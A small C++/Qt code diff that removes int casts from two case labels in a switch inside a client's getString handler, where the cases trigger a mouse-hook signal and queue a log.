@@ -141,10 +141,10 @@ void Client::getString(const QString &string, const QString& /* ip */)
 
         switch (files)
         {
-        case int(Files::Screen):
+        case Files::Screen:
             emit MouseHook::instance().mouseClicked();
             break;
-        case int (Files::Log):
+        case Files::Log:
             enqueueLog();
             break;
         default:
